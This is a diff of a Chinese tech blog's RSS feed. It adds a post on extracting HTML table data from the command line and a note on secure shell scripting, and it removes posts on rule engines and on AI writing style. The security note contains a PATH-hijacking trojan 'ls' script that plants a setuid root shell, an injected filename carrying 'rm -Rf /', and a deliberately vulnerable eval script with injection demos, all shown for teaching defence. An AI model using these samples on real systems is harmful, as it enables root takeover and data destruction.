@@ -4,10 +4,275 @@
     <title>暗无天日</title>
     <link>https://lujun9972.github.io</link>
     <description>=============&gt;DarkSun的个人博客</description>
-    <pubDate>Fri, 01 May 2026 15:24:11 UTC</pubDate>
-    <lastBuildDate>Fri, 01 May 2026 15:24:11 UTC</lastBuildDate>
+    <pubDate>Sat, 02 May 2026 03:44:05 UTC</pubDate>
+    <lastBuildDate>Sat, 02 May 2026 03:44:05 UTC</lastBuildDate>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>ego static site generator (https://github.com/emacs-china/ego)</generator>
+<item>
+<title>TIL-用 curl + w3m + awk 从 HTML 表格提取数据</title>
+<link>https://lujun9972.github.io/blog/2026/05/02/til-用-curl-+-w3m-+-awk-从-html-表格提取数据/index.html</link>
+<description>从网页的 HTML 表格里提取结构化数据是运维中的常见需求。手动复制粘贴遇到换行和空格就乱成一团。
+
+一种思路是用 Python 写脚本解析 HTML，但杀鸡用牛刀。Linux 命令行本身就有一整套工具可以搞定这件事。
+
+* 场景
+
+先准备一个本地 HTML 文件作为数据源（实际使用中换成 =curl= 抓取的 URL 即可）：
+
+#+begin_src shell
+cat &gt; /tmp/retailers.html &lt;&lt; &#39;EOF&#39;
+&lt;html&gt;
+&lt;body&gt;
+&lt;table class=&quot;data&quot;&gt;
+&lt;tr&gt;&lt;th&gt;排名&lt;/th&gt;&lt;th&gt;名称&lt;/th&gt;&lt;th&gt;营收&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Wal-Mart&lt;/td&gt;&lt;td&gt;$307.7B&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;Kroger&lt;/td&gt;&lt;td&gt;$78.3B&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;Target&lt;/td&gt;&lt;td&gt;$65.8B&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;Walgreen&lt;/td&gt;&lt;td&gt;$61.2B&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;The Home Depot&lt;/td&gt;&lt;td&gt;$60.2B&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+EOF
+#+end_src
+
+#+RESULTS:
+
+我们的目标是提取&quot;名称&quot;这一列。
+
+* 工具链
+
+整个管道由四步组成：
+
+第一步，用 =hxnormalize= 把 HTML 转成标准 XHTML 格式（某些网页的标签不闭合，直接处理会出事）：
+
+第二步，用 =hxselect= 按 CSS 选择器提取目标表格：
+
+第三步，用 =w3m -dump= 把 HTML 表格渲染成格式化文本（这会自动生成对齐好的列）：
+
+第四步，用 `awk` 按固定宽度提取需要的列：
+
+组合起来就是一条命令：
+
+#+begin_src shell :results raw
+cat /tmp/retailers.html \
+  | hxnormalize -x \
+  | hxselect -s &#39;\n&#39; &#39;table.data&#39; \
+  | w3m -dump -cols 2000 -T &#39;text/html&#39; \
+  | awk &#39;BEGIN{FIELDWIDTHS=&quot;5 29&quot;}{gsub(/^[ \t]+/, &quot;&quot;, $2); gsub(/[ \t]+$/, &quot;&quot;, $2); print $2}&#39;
+#+end_src
+
+#+RESULTS:
+名称
+Wal-Mart
+Kroger
+Target
+Walgreen
+The Home Depot
+
+
+* 关键技巧拆解
+
+=hxnormalize= 和 =hxselect= 来自 `html-xml-utils` 包。`hxnormalize -x` 补全缺失的结束标签、输出 XHTML；`hxselect &#39;table.data&#39;` 提取 CSS 选择器匹配的元素，`-s &#39;\n&#39;` 让每个元素之间插空行，防止 w3m 把相邻行粘在一起。
+
+=w3m -dump= 会把 HTML 渲染成纯文本表格，列宽自动对齐。`-cols 2000` 防止长行被截断导致列错位。这一步拿到的是固定宽度的文本，类似于这样：
+
+#+begin_example
+ 排名             名称                营收
+1       Wal-Mart                  $307.7B
+2       Kroger                    $78.3B
+3       Target                    $65.8B
+4       Walgreen                  $61.2B
+5       The Home Depot            $60.2B
+#+end_example
+
+=awk FIELDWIDTHS= 是 GNU Awk 的功能（不是 POSIX 标准）。`FIELDWIDTHS=&quot;5 29&quot;` 告诉 awk 按字符宽度切分字段：前 5 个字符是第一个字段（排名），接着 29 个字符是第二个字段（名称），剩下的全归第三个字段（营收）。
+
+后面的两个 =gsub= 去掉字段 2 首尾的空白，最后打印出公司名。
+
+* 注意事项
+
+- `html-xml-utils` 和 `w3m` 不是系统默认安装的，需要先装：`pacman -S html-xml-utils w3m` （Arch）或 `apt install html-xml-utils w3m` （Debian/Ubuntu）
+- `FIELDWIDTHS` 只在 GNU Awk 中可用，其他版本（如 mawk）不支持
+- 列宽需要根据实际表格调整。不确定宽度时，可以先跑完 =w3m= 步骤看看列的边界在哪里
+</description>
+<pubDate>2026-05-02</pubDate>
+<guid>https://lujun9972.github.io/blog/2026/05/02/til-用-curl-+-w3m-+-awk-从-html-表格提取数据/index.html</guid>
+</item>
+<item>
+<title>读：Shell脚本安全编码的五条铁律</title>
+<link>https://lujun9972.github.io/blog/2026/05/02/读：shell脚本安全编码的五条铁律/index.html</link>
+<description>虽说 Linux 比 Windows 病毒少，但这不是天生的免疫力。互联网上每时每刻都有扫描器在探测漏洞，从脚本小子到国家级黑客，都在找你的系统入口。
+
+Shell 脚本是 Linux 运维的日常工具，但正因为常用，安全问题反而容易被忽略。这篇笔记整理自 Linux Journal 上 Dave Taylor 写的 *Writing Secure Shell Scripts* ，总结五条脚本安全铁律，每条都有攻击示例和防御方法。
+
+* 铁律一：调用外部命令时指定完整路径
+
+先看一个经典的木马攻击场景。
+
+攻击者在 =/tmp= 下放一个名为 =ls= 的脚本，内容如下：
+
+#+begin_src shell
+#!/bin/sh
+
+if [ &quot;$USER&quot; = &quot;root&quot; ] ; then
+  /bin/cp /bin/sh /tmp/.secretshell
+  /bin/chown root /tmp/.secretshell
+  /bin/chmod 4666 /tmp/.secretshell
+fi
+
+exec /bin/ls $*
+#+end_src
+
+这个脚本做了两件事：如果你是 root，它偷偷复制一个 =/bin/sh= 到 =/tmp/.secretshell= 并设为 setuid root（任何人运行它都获得 root 权限）；然后假装什么都没发生，把参数传给真正的 =/bin/ls= 继续执行。
+
+如果 =PATH= 里包含了当前目录（ =.= ），而你恰好又在 =/tmp= 下执行 =ls= ，调用的就是这个木马脚本而不是系统的 =/bin/ls= 。
+
+更可怕的是，即便你的 =PATH= 里没有显式的 =.= ，如果 =PATH= 开头是 =:= ，它一样会先搜索当前目录（空字符串等于当前目录）：
+
+#+begin_src shell
+PATH=&quot;:/bin:/usr/bin:$HOME/bin&quot;
+#+end_src
+
+来看一个实际演示。我们先写一个假的 =ls= 脚本，让它只打印一行提醒，然后调真正的 =ls= 完成工作：
+
+#+begin_src shell
+cat &gt; /tmp/ls &lt;&lt; &#39;EOF&#39;
+#!/bin/sh
+echo &quot;【警告】调用了 /tmp/ls，不是系统的 /bin/ls！&quot; &gt;&amp;2
+exec /bin/ls &quot;$@&quot;
+EOF
+chmod +x /tmp/ls
+#+end_src
+
+#+begin_src shell
+cd /tmp
+PATH=&quot;.:/bin:/usr/bin&quot; ls
+#+end_src
+
+#+begin_example
+【警告】调用了 /tmp/ls，不是系统的 /bin/ls！
+...
+
+#+end_example
+
+*防御方法：* 两条规则二选一。
+1. 脚本中调用外部命令始终使用完整路径，比如 =/bin/ls= 而不是 =ls= 。
+2. 绝不让 =.= 出现在 =PATH= 中，即使在末尾也不行。好习惯是只在 =PATH= 中放绝对路径。
+
+* 铁律二：不要将密码硬编码到脚本中
+
+最容易犯的安全错误就是把密码直接写在脚本里：
+
+#+begin_src shell
+PASSWORD=&quot;froBOZ69&quot;
+#+end_src
+
+或者藏在别名里：
+
+#+begin_src shell
+alias synth=&#39;echo secretpw | pbcopy; sftp adt@wsynth.net&#39;
+#+end_src
+
+这两个做法的共同问题是：密码以明文形式躺在磁盘上。只要有人能读取这个文件（备份泄露、版本控制上传、同事误操作），密码就暴露了。
+
+*防御方法：* 使用专门的密码管理工具（如 pass 、 gopass ）或密钥代理（ssh-agent）。至少，也要把密码放在只有自己可读的环境变量文件里（ =~/.env= ，权限设为 =600= ），然后在脚本中 source 它。
+
+* 铁律三：用户输入必须引用和消毒
+
+下面这段脚本看起来无害：
+
+#+begin_src shell
+echo -n &quot;要查哪个文件？&quot;
+read name
+ls -l $name
+#+end_src
+
+但如果用户输入的&quot;文件名&quot;是：
+
+#+begin_src shell
+. ; /bin/rm -Rf /
+#+end_src
+
+那实际执行的就成了 =ls -l . ; /bin/rm -Rf /= ：先列当前目录，然后递归删除根分区。
+
+来做一个实际演示。注意，要演示分号注入，脚本必须用 =eval= 来解析参数。没有 =eval= 的话，Shell 不会在变量扩展后重新识别分号为命令分隔符：
+
+#+begin_src shell
+cat &gt; /tmp/vuln_eval.sh &lt;&lt; &#39;EOF&#39;
+#!/bin/sh
+echo &quot;查文件: $1&quot;
+eval ls -l $1
+EOF
+chmod +x /tmp/vuln_eval.sh
+#+end_src
+
+#+begin_src shell
+/tmp/vuln_eval.sh &quot;nonexistent; echo &#39;分号注入成功！&#39;&quot;
+#+end_src
+
+#+begin_example
+查文件: nonexistent; echo &#39;分号注入成功！&#39;
+ls: 无法访问 &#39;nonexistent&#39;: 没有那个文件或目录
+分号注入成功！
+#+end_example
+
+注意最后一行： =echo= 命令确实执行了（&quot;分号注入成功&quot; 被打印出来）。这就是命令注入：输入中的分号被解析为命令分隔符。
+
+光用 =eval= 还不够，还必须加上引号。如果把 =eval ls -l $1= 改为 =eval ls -l &quot;$1&quot;= ，分号就会变成普通字符，不再起到命令分隔的作用。
+
+除了分号，反引号是另一种注入方式，而且不需要 =eval= 就能生效。Shell 在变量扩展阶段就会执行反引号里的命令：
+
+#+begin_src shell
+/tmp/vuln_eval.sh &quot;`echo &#39;反引号注入成功&#39;`&quot;
+#+end_src
+
+#+begin_example
+查文件: 反引号注入成功
+ls: 无法访问 &#39;反引号注入成功&#39;: 没有那个文件或目录
+#+end_example
+
+反引号里的 =echo= 命令确实被执行了，它的输出被当成了&quot;文件名&quot;参数传给 =ls= 。
+
+*防御方法：* 引用变量是最简单的防线：
+
+#+begin_src shell
+/bin/ls -l &quot;$name&quot;
+#+end_src
+
+但引用只能防止单词分割，不能防止命令注入。如果你的脚本需要处理来自未知用户的输入，更可靠的做法是对输入做消毒：只允许字母、数字和一小组安全标点，碰到其他字符就直接报错退出。
+
+* 铁律四：不要用 Shell 脚本写 CGI
+
+搭建了 Linux Web 服务器，想写个简单的 CGI 脚本查系统负载？Shell 脚本确实是最快的选择：
+
+#+begin_src shell
+#!/bin/sh
+
+echo &quot;Content-type: text/html&quot;; echo &quot;&quot;
+echo &quot;Uptime on the Server:&lt;pre&gt;&quot;
+uptime
+echo &quot;&lt;/pre&gt;&quot;
+#+end_src
+
+这个脚本本身问题不大，但它展示了一种危险模式：Web 请求会触发 Shell 执行。一旦脚本需要处理用户输入（比如做站内搜索），攻击面就完全打开了：任何人都能通过构造 HTTP 参数向你的服务器注入命令。
+
+*防御方法：* 即使只是简单的 CGI 功能，也不要用 Shell 脚本。用编译型语言（C、Go）或至少是提供了良好输入安全保证的脚本语言（Python、Ruby 等）来实现。这些语言对特殊字符的处理比 Shell 更可控。或者直接使用第三方搜索服务（如 Google Custom Search Engine），从源头避免这个问题。
+
+* 铁律五：编码始终关注安全
+
+上面四条铁律覆盖了 Shell 脚本最常见的攻击面，但安全不是做完就了事的检查项。每次写脚本时都应该问自己：
+
+1. 这个脚本会调用哪些外部命令？路径可靠吗？
+2. 脚本里有没有敏感信息（密码、密钥）？
+3. 脚本的输入从哪里来？可信吗？不可信的话有没有消毒？
+4. 脚本会被谁执行？以什么权限执行？
+
+如果对这些问题没有把握，可以参考一些好的编码规范，比如 Google 的 *Shell Style Guide* 。Apple 官方也有一份 *Shell Script Security* 文档值得阅读。编写安全的 Shell 脚本与其说靠技巧，不如说靠习惯：每次写脚本时多问自己几句。
+</description>
+<pubDate>2026-05-02</pubDate>
+<guid>https://lujun9972.github.io/blog/2026/05/02/读：shell脚本安全编码的五条铁律/index.html</guid>
+</item>
 <item>
 <title>读：AI Agent 安全日志——从可见性与隐私的两难说起</title>
 <link>https://lujun9972.github.io/blog/2026/05/01/读：ai-agent-安全日志——从可见性与隐私的两难说起/index.html</link>
@@ -1570,156 +1835,6 @@ SELECT id, name, email FROM users WHERE active = true ORDER BY created_at DESC L
 </description>
 <pubDate>2026-05-01</pubDate>
 <guid>https://lujun9972.github.io/blog/2026/05/01/读：整洁代码的几个通用原则——从-go-生态看起/index.html</guid>
-</item>
-<item>
-<title>读：规则引擎——从 if-else 到业务规则管理</title>
-<link>https://lujun9972.github.io/blog/2026/05/01/读：规则引擎——从-if-else-到业务规则管理/index.html</link>
-<description>* 开篇：if-else 的尽头
-
-大部分软件的业务逻辑都是从几行 if-else 开始的。然后需求雪球越滚越大：新促销、合规调整、用户分层……等回过神来，代码已经复杂到改一个折扣条件要翻遍整个代码库，怕改漏了，怕影响不相干的逻辑。
-
-这种痛我猜大部分后端开发都经历过。规则引擎（Rule Engine）这个听起来有点年代感的概念，就是为这个场景设计的。
-
-在 DZone 上读了一篇介绍（[[https://dzone.com/articles/how-rule-engines-transform-business-agility][How Rule Engines Transform Business Agility and Code Simplicity]]，作者 Venkatesh S），把规则引擎的适用场景和边界讲得比较实在。这篇笔记记下关键点和自己的理解。
-
-* 规则引擎是什么：三句话
-
-第一句：规则引擎把 IF-THEN 从代码里搬到代码外。
-
-第二句：还是 IF-THEN，只是不用在 Java/Python/Clojure 里写 if-else 了，改成在配置文件或管理界面里写 ~IF customer.tier = &#39;GOLD&#39; AND order.total &gt; 100 THEN apply 15% discount~ 。
-
-第三句：非开发者也能改这些规则。运营想改折扣、合规想调整审批门槛、风控想加一个新检测规则，他们自己改，不用等你排期。
-
-这三句话够用了。Drools 的 Rete 算法、前向链后向链、推理引擎怎么匹配规则，这些等真正需要的时候再了解也不迟。
-
-* 规则引擎的决策框架
-
-什么时候该上规则引擎，什么时候不该，原文给了一些判断标准，整理成四问：
-
-*你的规则变化有多频繁* ：规则每周都在变（促销活动、合规政策、风控策略）→ 值得考虑。规则一年改一两次 → 不需要，if-else 更直接。
-
-*非技术人员有没有能力改规则* ：运营/合规的人能写 =IF score &gt; threshold= 这种级别的条件 → 上了规则引擎确实能减少你的负担。他们连 CSV 都填不利索 → 上了规则引擎最后也是你改，白多一层复杂度。
-
-*性能要求多高* ：规则引擎运行时做模式匹配，比硬编码的 if-else 慢一个数量级。高并发低延迟的场景（如实时支付风控）需要谨慎评估。批处理、后台审核这类场景无所谓。
-
-*规则的规模有多大* ：10 条以下的规则 → if-else 是正确答案。200 条以上 → 规则引擎的收益开始显现，硬编码的复杂性已经失控。10 到 200 条之间是灰色地带，具体情况具体分析。
-
-原文还列了一张对比表，把传统方式（硬编码逻辑）和规则引擎方式对比得更全面：
-
-| 维度 | 硬编码 | 规则引擎 |
-|------|--------|----------|
-| 变更速度 | 改代码+测试+部署，论周算 | 业务人员在 UI 上改，论小时算 |
-| 业务方参与 | 开发者当传话筒 | 领域专家直接管理规则 |
-| 复杂度上限 | 10--20 个条件就难维护了 | 1000+ 条件也能管 |
-| 审计追踪 | 逻辑散在代码里，难查决策历史 | 规则有版本号，谁改了什么一目了然 |
-| 测试影响 | 改一次全面回归 | 规则可以单独测 |
-| 出错风险 | 改复杂条件容易引入 bug | 规则独立，改一个不影响其他 |
-| 团队效率 | 开发者整天改业务逻辑 | 开发者专注平台能力 |
-
-* 框架生态速览
-
-规则引擎的生态很丰富，但说实话大部分场景不需要纠结选哪个，了解几个就够了：
-
-- =Drools= ：Java 生态的老大哥，功能最全但也最重。大型企业级场景首选
-- =Easy Rules= ：轻量级 Java 规则引擎，如果你的需求不复杂可以试试这个
-- =JSON Rules Engine= ：规则用 JSON 写，和语言无关。适合想把规则存数据库或通过 API 管理的场景
-- =DMN（Decision Model and Notation）= ：OMG 标准的决策模型表示法，用 Camunda 等流程引擎可以执行。适合需要跨组织和跨工具协作决策逻辑的场景
-
-选框架的核心不是功能对比，而是：你的规则将来由谁维护、用什么工具改、想把这层逻辑放在代码里还是外部系统里。
-
-* 总结
-
-规则引擎不是银弹。它做的是一笔交易：用一层&quot;规则管理层&quot;替换代码里的散装 if-else。这笔交易值不值，取决于规则的变动频率、维护者的动手能力、以及对性能的容忍度。
-
-对于大多数项目来说，最优解可能不是&quot;全上规则引擎&quot;也不是&quot;全用 if-else&quot;，而是在业务逻辑最密集、变化最快的部分划出边界，用规则引擎管理起来。其他地方继续用常规代码。
-</description>
-<pubDate>2026-05-01</pubDate>
-<guid>https://lujun9972.github.io/blog/2026/05/01/读：规则引擎——从-if-else-到业务规则管理/index.html</guid>
-</item>
-<item>
-<title>AI写作的语言指纹——如何让文字不那么像机器</title>
-<link>https://lujun9972.github.io/blog/2026/04/30/ai写作的语言指纹——如何让文字不那么像机器/index.html</link>
-<description>Reddit 用户在 r/ChatGPT 版块贴出了一张数据图：美国大公司文档中&quot;不是 A，而是 B&quot;这个句式的使用量，在 2024 年和 2025 年分别翻了一番。评论区迅速从震惊变成集体恐慌，因为大家发现自己写的东西也在不知不觉中被这种句式殖民了。
-
-[[https://www.jdon.com/91549-ai-language-parasite-chatgpt-writing-style-human.html][原文链接]]
-
-这篇文章整理了 AI 写作中最容易被识别的语言特征，解释了 AI 为什么会形成这些特征，并给出去除 AI 感的实操方法。
-
-* AI 写作的六个语言标记
-
-** 1. &quot;不是 A，而是 B&quot;句式
-
-先否定一个常见认知，再抛出修正说法。这个修辞手法本身没问题，但 AI 在几乎所有回答中都使用它。Reddit 用户把它叫做&quot;否定平行结构&quot;。当它从&quot;偶尔用来强调&quot;变成&quot;每次都用来组织观点&quot;时，就变成了识别 AI 的金标准。
-
-** 2. 长破折号（em dash）
-
-AI 极度偏爱长破折号，经常在一个段落里出现多次。人类写作者也用长破折号，但频率远低于 AI。一位 Reddit 用户说他每次把 ChatGPT 的回答粘贴到邮件里，都会手动把长破折号换成普通连字符，就像&quot;狐狸掩盖自己的踪迹&quot;。
-
-** 3. &quot;重要的是注意到&quot;等过渡词
-
-AI 喜欢用&quot;重要的是注意到&quot;&quot;值得指出的是&quot;&quot;事情是这样的&quot;这类过渡词来为观点建框架。人类在自然对话中会直接说事，不会先宣布&quot;接下来我要说一个重要的事情&quot;。
-
-** 4. &quot;悄悄地做某事&quot;
-
-&quot;X 在悄悄地做 Y&quot;，这个表达在 AI 生成的商业写作中出现频率极高。本来用于描述低调但重要的趋势，现在已经被用成了一种万能修辞。
-
-** 5. 三段式结构
-
-AI 的典型段落结构是：先声明观点，然后用三个论据支撑，最后总结。Reddit 用户吐槽说：&quot;事情是这样的，后面跟着一个结构完美的三段式解释，根本没有人会真的这样打字。&quot;
-
-** 6. 单句成段
-
-为了强调，AI 经常把每句话写成独立段落。这种格式在营销文案中本有效果，但 AI 把它当成了默认输出模式，导致到处都是这种碎片化排版。
-
-* AI 为什么会形成这些特征
-
-理解原因有助于有针对性地修改。AI 的语言风格来自四个层面的叠加：
-
-1. *概率安全优先*：AI 优化的是&quot;大概率正确&quot;，并非&quot;风格多样&quot;。训练过程中，那些在各种上下文中都安全的表达方式会得到更高的概率权重。结果是，模型的输出风格是所有训练数据的统计平均值，技术上来自很多源头，感觉上非常重复。
-
-2. *RLHF 的风格滤镜*：RLHF（基于人类反馈的强化学习）是一种训练方法，先让人类标注员给 AI 的多个回答打分排序，再用这些评分数据调整 AI 的行为，让输出更符合人类偏好。效果是让 AI 更礼貌、更安全、更易读，但副作用是把风格推向一个&quot;安全的中间值&quot;，过滤掉有个性的表达。这相当于给 AI 套了一件灰色制服，过滤掉有趣但可能出格的表达，把输出推向可预测的短到中等长度句子、明确的过渡词、最低限度的歧义。
-
-3. *逐词生成的惯性*：AI 每次只预测下一个最可能的词。一旦句子以一种结构开头，后续的词会倾向于维持这个结构。人类可以在句子中间突然转折，AI 很少这样做，因为它被训练成追求语法完美和逻辑连贯。
-
-4. *没有持久的个人记忆*：每个会话都是全新的，AI 不会像人类那样在多年写作中积累独特的习惯和风格。所以你反复使用 AI 时，感受到的只是统计模型在重复它最擅长的模式，根本谈不上有个性的写作者在进化。
-
-* 去除 AI 感的实操方法
-
-** 写完后搜索这些关键词
-
-Reddit 用户 rafio77 的做法很实用：&quot;我现在每稿都用 Ctrl+F 搜索，不是...而是、长破折号、以及&#39;事实上&#39;开头的句子。&quot;这是一个标准的三件套检查清单。建议扩展为以下搜索项：
-
-- 不是...而是
-- 长破折号
-- 重要的是 / 值得注意的是 / 事情是这样的
-- 悄悄地
-- 事实上
-
-** 用简单的替代方案替换
-
-长破折号通常可以用逗号、冒号或分号替代。&quot;不是 A，而是 B&quot;可以改为直接陈述 B，或者用&quot;但&quot;字连接。&quot;重要的是&quot;这类过渡词直接删除，不会影响语义。
-
-** 故意制造不完美
-
-AI 最大的破绽是过于完美。去除 AI 感最有效的方法是引入人类写作中常见的&quot;不完美&quot;：
-
-- 变化句子长度：用很短的句子打断长句的节奏
-- 允许口语化表达：偶尔用一些不够正式但更自然的说法
-- 不要每个观点都建立框架：直接说，不要先预告&quot;我要说一个重要的观点&quot;
-- 允许段落之间有不那么完美的过渡
-
-** 要求 AI 模仿特定风格
-
-如果你用 AI 辅助写作，可以在提示词中加入风格要求：使用碎片化句子、故意变化句子长度、模仿某种特定口吻。AI 能做到这些，只是默认不做，因为这些风格不够&quot;普遍安全&quot;。
-
-* 总结
-
-AI 的语言指纹是一整套表达模式的同质化，远不止某一个词或某一种句式。你堵住了&quot;不是...而是&quot;这个句式，还有长破折号；改掉了长破折号，还有过渡词；改掉了过渡词，还有三段式结构。所以去除 AI 感只改掉一两个特征是不够的，得让自己的写作回归到人类写作的本质特征：不完美但自然，多变但连贯。
-
-就像一位 Reddit 用户说的：&quot;&#39;什么让写作看起来像人&#39;这个问题以前是一个文学理论辩论。现在它只是一个星期二。&quot;
-</description>
-<pubDate>2026-04-30</pubDate>
-<guid>https://lujun9972.github.io/blog/2026/04/30/ai写作的语言指纹——如何让文字不那么像机器/index.html</guid>
 </item>
 </channel>
 </rss>
